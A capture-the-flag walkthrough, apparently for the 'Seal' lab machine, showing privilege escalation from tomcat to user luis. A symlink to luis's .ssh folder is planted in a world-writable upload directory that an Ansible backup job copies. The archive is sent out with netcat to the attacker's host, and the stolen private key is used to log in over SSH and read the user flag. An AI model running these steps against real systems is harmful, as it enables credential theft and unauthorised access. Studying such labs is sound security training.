# Enumeration -

```bash
tomcat@seal:/home/luis$ cd /home
tomcat@seal:/home$ ls
luis
tomcat@seal:/home$ cd luis/
tomcat@seal:/home/luis$ ls -la
total 51320
drwxr-xr-x 9 luis luis     4096 May  7 07:01 .
drwxr-xr-x 3 root root     4096 May  5 12:52 ..
drwxrwxr-x 3 luis luis     4096 May  7 06:00 .ansible
lrwxrwxrwx 1 luis luis        9 May  5 12:57 .bash_history -> /dev/null
-rw-r--r-- 1 luis luis      220 May  5 12:52 .bash_logout
-rw-r--r-- 1 luis luis     3797 May  5 12:52 .bashrc
drwxr-xr-x 3 luis luis     4096 May  7 07:00 .cache
drwxrwxr-x 3 luis luis     4096 May  5 13:45 .config
drwxrwxr-x 6 luis luis     4096 Jul 15 21:53 .gitbucket
-rw-r--r-- 1 luis luis 52497951 Jan 14  2021 gitbucket.war
drwxrwxr-x 3 luis luis     4096 May  5 13:41 .java
drwxrwxr-x 3 luis luis     4096 May  5 14:33 .local
-rw-r--r-- 1 luis luis      807 May  5 12:52 .profile
drwx------ 2 luis luis     4096 May  7 06:10 .ssh
-r-------- 1 luis luis       33 Jul 15 21:53 user.txt
```

- .ansible looks strange

### Checking for the running processes -

```bash
tomcat@seal:/home/luis$ ps -aux                                                                                                                               
USER         PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND                                                                                    
root           1  0.0  0.2 169152 11236 ?        Ss   21:52   0:01 /sbin/init maybe-ubiquity                                                                  
root           2  0.0  0.0      0     0 ?        S    21:52   0:00 [kthreadd]                                                                                 
root           3  0.0  0.0      0     0 ?        I<   21:52   0:00 [rcu_gp]                                                                                   
root           4  0.0  0.0      0     0 ?        I<   21:52   0:00 [rcu_par_gp]                                                                               
root           6  0.0  0.0      0     0 ?        I<   21:52   0:00 [kworker/0:0H-kblockd]                                                                     
root           9  0.0  0.0      0     0 ?        I<   21:52   0:00 [mm_percpu_wq]                                                                             
root          10  0.0  0.0      0     0 ?        S    21:52   0:00 [ksoftirqd/0]                                                                              
root          11  0.1  0.0      0     0 ?        I    21:52   0:03 [rcu_sched]                                                                                
root          12  0.0  0.0      0     0 ?        S    21:52   0:00 [migration/0] 
<SNIPPET>
root       42598  0.0  0.0   2608   548 ?        Ss   22:33   0:00 /bin/sh -c sleep 30 && sudo -u luis /usr/bin/ansible-playbook /opt/backups/playbook/run.yml
```

There is  a process running as luis lets check it out 

```bash
tomcat@seal:/opt/backups/playbook$ cat run.yml 
- hosts: localhost
  tasks:
  - name: Copy Files
    synchronize: src=/var/lib/tomcat9/webapps/ROOT/admin/dashboard dest=/opt/backups/files copy_links=yes
  - name: Server Backups
    archive:
      path: /opt/backups/files/
      dest: "/opt/backups/archives/backup-{{ansible_date_time.date}}-{{ansible_date_time.time}}.gz"
  - name: Clean
    file:
      state: absent
      path: /opt/backups/files/
```

- The interesting part of this thing is that it also copies the symlink as it has copy_links=yes.So we can create symlink of files inside this folder.

### Checking the folder -

```bash
tomcat@seal:/var/lib/tomcat9/webapps/ROOT/admin/dashboard$ ls -la
total 100
drwxr-xr-x 7 root root  4096 May  7 09:26 .
drwxr-xr-x 3 root root  4096 May  6 10:48 ..
drwxr-xr-x 5 root root  4096 Mar  7  2015 bootstrap
drwxr-xr-x 2 root root  4096 Mar  7  2015 css
drwxr-xr-x 4 root root  4096 Mar  7  2015 images
-rw-r--r-- 1 root root 71744 May  6 10:42 index.html
drwxr-xr-x 4 root root  4096 Mar  7  2015 scripts
drwxrwxrwx 2 root root  4096 Jul 15 22:30 uploads
```

We have write access to the uploads folder.

### Creating symlink of ssh keys of user luis -

```bash
tomcat@seal:/var/lib/tomcat9/webapps/ROOT/admin/dashboard/uploads$ ln -s /home/luis/.ssh/ /var/lib/tomcat9/webapps/ROOT/admin/dashboard/uploads
tomcat@seal:/var/lib/tomcat9/webapps/ROOT/admin/dashboard/uploads$ ls
tomcat@seal:/var/lib/tomcat9/webapps/ROOT/admin/dashboard/uploads$ ls -la
total 8
drwxrwxrwx 2 root   root   4096 Jul 15 23:20 .
drwxr-xr-x 7 root   root   4096 May  7 09:26 ..
lrwxrwxrwx 1 tomcat tomcat   16 Jul 15 23:20 .ssh -> /home/luis/.ssh/
```


### Copying the backup file to temp -

```bash
tomcat@seal:/var/lib/tomcat9/webapps/ROOT/admin/dashboard/uploads$ cd /opt/backups/archives/
tomcat@seal:/opt/backups/archives$ ls -la
total 1196
drwxrwxr-x 2 luis luis   4096 Jul 15 23:21 .
drwxr-xr-x 4 luis luis   4096 Jul 15 23:21 ..
-rw-rw-r-- 1 luis luis 606047 Jul 15 23:20 backup-2021-07-15-23:20:32.gz
-rw-rw-r-- 1 luis luis 609576 Jul 15 23:21 backup-2021-07-15-23:21:32.gz
tomcat@seal:/opt/backups/archives$ cp backup-2021-07-15-23\:21\:32.gz /tmp/napster.gz
tomcat@seal:/opt/backups/archives$ cd /tmp
tomcat@seal:/tmp$ ls -la
total 608
drwxrwxrwt  3 root   root     4096 Jul 15 23:22 .
drwxr-xr-x 20 root   root     4096 May  7 09:26 ..
drwxr-x---  2 tomcat tomcat   4096 Jul 15 23:12 hsperfdata_tomcat
-rw-r-----  1 tomcat tomcat 609576 Jul 15 23:22 napster.gz
```

### Transferring to our local machine -

```bash
tomcat@seal:/tmp$ nc -w 3 10.10.14.127 9600 < napster.gz
```

```bash
root@napster:~/Documents/HTB/Seal# nc -nvlp 9600 > napster.gz                                                                                                 
listening on [any] 9600 ...                                                                                                                                   
connect to [10.10.14.127] from (UNKNOWN) [10.10.10.250] 49190                                                                                                 
root@napster:~/Documents/HTB/Seal# ls -la                                                                                                                     
total 632                                                                                                                                                     
drwxr-xr-x   4 root root   4096 Jul 15 19:22 .                                                                                                                
drwxr-xr-x 110 root root   4096 Jul 10 15:18 ..                                                                                                               
-rw-r--r--   1 root root     51 Jul 15 12:52 gobuster_admin.txt                                                                                               
-rw-r--r--   1 root root    968 Jul 15 12:59 gobuster_manager.txt                                                                                             
-rw-r--r--   1 root root    184 Jul 15 12:44 gobuster.txt                                                                                                     
-rw-r--r--   1 root root 609576 Jul 15 19:23 napster.gz                                                                                                       
-rw-r--r--   1 root root   1092 Jul 15 17:19 napster.war                                                                                                      
drwxr-xr-x   2 root root   4096 Jul 10 15:18 nmap                                                                                                             
drwxr-xr-x   4 root root   4096 Jul 15 18:30 Seal                                                                                                             
-rw-r--r--   1 root root   1066 Jul 15 16:54 wfuzz.txt
root@napster:~/Documents/HTB/Seal# gunzip napster.gz                                                                                                          
root@napster:~/Documents/HTB/Seal# ls                                                                                                                         
gobuster_admin.txt  gobuster_manager.txt  gobuster.txt  napster  napster.war  nmap  Seal  wfuzz.txt                                                           
root@napster:~/Documents/HTB/Seal# file napster                                                                                                               
napster: POSIX tar archive                                                                                                                                    
root@napster:~/Documents/HTB/Seal# tar -xf napster                                                                                                            
root@napster:~/Documents/HTB/Seal# ls                                                                                                                         
dashboard  gobuster_admin.txt  gobuster_manager.txt  gobuster.txt  napster  napster.war  nmap  Seal  wfuzz.txt                                                
root@napster:~/Documents/HTB/Seal# cd dashboard/                                                                                                              
root@napster:~/Documents/HTB/Seal/dashboard# cd uploads/
root@napster:~/Documents/HTB/Seal/dashboard/uploads# ls
root@napster:~/Documents/HTB/Seal/dashboard/uploads# ls -la
total 12
drwxrwxrwx 3 1000 1000 4096 Jul 15 19:24 .
drwxr-xr-x 7 1000 1000 4096 May  7 05:26 ..
drwx------ 2 1000 1000 4096 May  7 02:10 .ssh
root@napster:~/Documents/HTB/Seal/dashboard/uploads/.ssh# ls
authorized_keys  id_rsa  id_rsa.pub
```

- We got the private key of user luis


# SSH -

```bash
root@napster:~/Documents/HTB/Seal# chmod +600 id_rsa 
root@napster:~/Documents/HTB/Seal# ssh luis@10.10.10.250 -i id_rsa
Last login: Thu Jul 15 23:15:08 2021 from 10.10.14.162
luis@seal:~$ id
uid=1000(luis) gid=1000(luis) groups=1000(luis)
luis@seal:~$ ls -la
total 51332
drwxr-xr-x 9 luis luis     4096 Jul 15 23:22 .
drwxr-xr-x 3 root root     4096 May  5 12:52 ..
drwxrwxr-x 3 luis luis     4096 May  7 06:00 .ansible
lrwxrwxrwx 1 luis luis        9 May  5 12:57 .bash_history -> /dev/null
-rw-r--r-- 1 luis luis      220 May  5 12:52 .bash_logout
-rw-r--r-- 1 luis luis     3797 May  5 12:52 .bashrc
drwxr-xr-x 3 luis luis     4096 May  7 07:00 .cache
drwxrwxr-x 3 luis luis     4096 May  5 13:45 .config
drwxrwxr-x 6 luis luis     4096 Jul 15 23:12 .gitbucket
-rw-r--r-- 1 luis luis 52497951 Jan 14  2021 gitbucket.war
drwxrwxr-x 3 luis luis     4096 May  5 13:41 .java
drwxrwxr-x 3 luis luis     4096 May  5 14:33 .local
-rw-r--r-- 1 luis luis      807 May  5 12:52 .profile
drwx------ 2 luis luis     4096 May  7 06:10 .ssh
-r-------- 1 luis luis       33 Jul 15 23:12 user.txt
-rw------- 1 luis luis     9504 Jul 15 23:22 .viminfo
luis@seal:~$ cat user.txt 
97f601a25a423bcdde8acaa4c66a85fb
```